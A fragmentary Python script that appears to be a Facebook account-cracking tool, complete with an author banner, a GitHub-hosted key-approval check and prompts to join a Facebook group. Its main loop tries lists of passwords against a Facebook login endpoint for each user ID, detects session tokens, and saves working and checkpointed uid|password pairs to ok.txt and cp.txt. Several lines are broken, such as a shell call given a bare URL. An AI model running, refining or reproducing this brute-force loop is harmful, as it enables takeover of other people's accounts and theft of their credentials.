...
def logo():
 ...
 ───────────────────────────────────────────────────────×
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Rahim Islam   \x1b[0m\x1b[1;97m]
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :6\x1b[0m\x1b[1;97m] \033[1;37m
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Rahim Islam    \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : Toxic-Rahim Islam  \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : Rahim Islam    \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────×
 """)
...
def helpnote():
        print("%s [=>] JOIN MY GROUP AND. GET MORE UPDATE  :)"%(G))
        #yahan nichy httsp sy hata kr apna github aproval link dalna
        subprocess.check_output(["am", "start", "https://github.com/Toxic-Rahim Islam /just-now/blob/main/Approved.txt"])
        #yahan apni facebook id link dalna
        exit(" [=>] FACEBOOK : Rahim Islam    ")
...
def notice():
        ...
        os.system("https://facebook.com/groups/1215404685982268/")
        runtxt("\033[0;97m Key Approval To join Group And comment pin post >> %s%s"%(G,basesplit))
        runtxt("\033[0;97m Key group admin ke post pe coment krein")
        os.system("xdg-open https://facebook.com/groups/1215404685982268/")
        subprocess.check_output(["am", "start", "https://facebook.com/groups/1215404685982268/"])
...
class Main:
        def __init__(self):
                ...
                try:
                        ...
                        plr = requests.get('https://github.com/Toxic-Rahim Islam /just-now/blob/main/Approved.txt').text
                        if basesplit in plr:
                                key = basesplit
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 6\x1b[0m\x1b[1;97m] \033[1;37m
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Rahim Islam \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : Toxic-Rahim\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : Rahim Islam \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────×
    """)
                ...
                print("───────────────────────────────────────────────────────× ")
                print(" \t\033[1;97m[\x1b[1;97m\x1b[1;41m JOIN MY GROUP\x1b[0m\x1b[1;97m] \033[1;37m ")
                subprocess.check_output(["am", "start", "GET NEW COMMAND"])
                print("───────────────────────────────────────────────────────× ")
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
                ...
                for pw in pwx:
                        ...
                        if "session_key" in response.text and "EAAA" in response.text:
                                print("\r  \033[0;97m   [AY4N-OK] %s | %s\033[0;97m         "%(uid, pw))
                                self.ok.append("%s|%s"%(uid, pw))
                                open("ok.txt","a").write("   [AY4N-OK]  %s|%s\n"%(uid, pw))
                                break
                        elif "www.facebook.com" in response.json()["error_msg"]:
                                print("\r  \033[0;92m   [AY4N-OK] %s | %s\033[0;97m         "%(uid, pw))
                                self.cp.append("%s|%s"%(uid, pw))
                                open("cp.txt","a").write("   [AY4N-OK]  %s|%s\n"%(uid, pw))
                                break
                        else:
                                continue
...
if len(sys.argv) == 2:
        if sys.argv[1] == "--info":
                ...
                print(" [*] Facebook  : Rahim islam")
                print(" [*] Instagram : Rahim Islam   / ")
                print(" [*] YouTube   : [ERROR] ")
                exit(" [*] GitHub    : Toxic-Rahim Islam  ")
        else:
                Main()
